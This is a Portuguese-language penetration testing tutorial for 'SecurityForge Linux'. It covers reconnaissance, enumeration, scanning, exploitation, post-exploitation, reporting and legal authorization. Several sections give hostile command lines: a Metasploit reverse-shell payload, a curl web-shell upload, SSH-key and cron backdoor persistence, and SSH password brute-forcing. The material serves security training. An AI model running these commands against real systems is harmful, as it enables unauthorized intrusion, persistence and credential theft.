# 🎯 SecurityForge Linux - Tutorial de Penetration Testing

## 📋 Metodologia

### 1. Reconhecimento (Reconnaissance)
#### Reconhecimento Passivo
```bash
# OSINT básico
theharvester -d target.com -b google,bing,duckduckgo
sherlock target_username

# Busca de subdomínios
subfinder -d target.com
amass enum -d target.com

# Busca de informações públicas
shodan search "org:target"
```

#### Reconhecimento Ativo
```bash
# Descoberta de hosts
nmap -sn 192.168.1.0/24
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Port scanning
nmap -sS -T4 -A target.com
rustscan -a target.com -- -sV -sC
```

### 2. Enumeração (Enumeration)
#### Serviços Web
```bash
# Descoberta de tecnologias
whatweb target.com
wafw00f target.com

# Directory/file enumeration
gobuster dir -u http://target.com -w $WORDLISTS/web-directories.txt
ffuf -w $WORDLISTS/web-directories.txt -u http://target.com/FUZZ

# Subdomain enumeration
gobuster dns -d target.com -w $WORDLISTS/subdomains.txt
```

#### Serviços de Rede
```bash
# SMB enumeration
enum4linux target.com
smbclient -L //target.com/

# SNMP enumeration
snmpwalk -c public -v1 target.com

# DNS enumeration
dnsrecon -d target.com
dnsenum target.com
```

### 3. Análise de Vulnerabilidades
#### Scanners Automatizados
```bash
# Nikto para web
nikto -h http://target.com

# Nuclei para vulnerabilidades modernas
nuclei -u http://target.com

# OpenVAS (se instalado)
openvas-start
```

#### Testes Web Específicos
```bash
# SQL Injection
sqlmap -u "http://target.com/page?id=1" --dbs

# XSS testing
dalfox url http://target.com/search?q=test

# XXE testing
xxeinjector --host=target.com --path=/upload --file=test.xml
```

### 4. Exploração (Exploitation)
#### Metasploit Framework
```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search type:exploit platform:linux

# Configurar payload
use exploit/linux/http/example_exploit
set RHOSTS target.com
set payload linux/x64/meterpreter/reverse_tcp
set LHOST your_ip
exploit
```

#### Exploits Manuais
```bash
# Buscar exploits conhecidos
searchsploit service_name version

# Buffer overflow
python exploit.py target.com port

# Web shell upload
curl -F "file=@shell.php" http://target.com/upload.php
```

### 5. Pós-Exploração (Post-Exploitation)
#### Privilege Escalation
```bash
# Linux privilege escalation
./linpeas.sh
./linux-exploit-suggester.sh

# Windows privilege escalation
./winpeas.exe
./powerup.ps1
```

#### Persistência
```bash
# SSH key persistence
ssh-keygen -t rsa
echo "public_key" >> ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /tmp/backdoor.sh" | crontab -
```

#### Lateral Movement
```bash
# Network discovery
arp -a
netstat -an

# Password attacks
hydra -l admin -P $WORDLISTS/common-passwords.txt ssh://192.168.1.100
```

## 🛠️ Ferramentas por Fase

### Reconhecimento
- **nmap** - Network scanning
- **masscan** - Fast port scanner
- **subfinder** - Subdomain discovery
- **amass** - Attack surface mapping
- **theharvester** - Email gathering

### Enumeração
- **gobuster** - Directory/DNS bruting
- **ffuf** - Web fuzzer
- **enum4linux** - SMB enumeration
- **dnsenum** - DNS enumeration

### Vulnerabilidades
- **nikto** - Web vulnerability scanner
- **nuclei** - Modern vulnerability scanner
- **sqlmap** - SQL injection testing
- **dalfox** - XSS scanner

### Exploração
- **metasploit** - Exploitation framework
- **searchsploit** - Exploit database
- **msfvenom** - Payload generator

### Pós-Exploração
- **linpeas** - Linux privilege escalation
- **winpeas** - Windows privilege escalation
- **mimikatz** - Windows credential extraction

## 📊 Metodologias Reconhecidas

### OWASP Testing Guide
1. Information Gathering
2. Configuration and Deployment Management Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. Error Handling
9. Cryptography
10. Business Logic Testing
11. Client Side Testing

### NIST Cybersecurity Framework
1. **Identify** - Asset management
2. **Protect** - Access control
3. **Detect** - Anomaly detection
4. **Respond** - Incident response
5. **Recover** - Recovery planning

### PTES (Penetration Testing Execution Standard)
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

## 📝 Documentação de Testes

### Template de Relatório
```markdown
# Penetration Testing Report

## Executive Summary
- Scope
- Methodology
- Key Findings
- Risk Rating

## Technical Findings
### High Risk
- Vulnerability Description
- Impact
- Proof of Concept
- Remediation

### Medium Risk
- ...

### Low Risk
- ...

## Recommendations
1. Immediate Actions
2. Short-term Improvements
3. Long-term Strategy
```

### Screenshots e Evidências
```bash
# Capturar screenshots
gnome-screenshot -f evidence.png

# Salvar output de comandos
nmap target.com | tee nmap-results.txt

# Gravar sessão terminal
script session-recording.txt
```

## ⚖️ Considerações Legais

### Antes de Começar
1. **Autorização por escrito** do proprietário do sistema
2. **Escopo bem definido** do teste
3. **Regras de engajamento** claras
4. **Contrato de confidencialidade**

### Durante o Teste
1. **Respeitar o escopo** acordado
2. **Evitar danos** aos sistemas
3. **Documentar tudo** adequadamente
4. **Comunicar problemas críticos** imediatamente

### Após o Teste
1. **Relatório detalhado** com evidências
2. **Limpeza** de artefatos deixados
3. **Apresentação** dos resultados
4. **Suporte** para remediation

---

> ⚠️ **Lembrete:** Use essas técnicas apenas em sistemas que você possui ou tem autorização explícita para testar. O uso não autorizado pode ser ilegal.
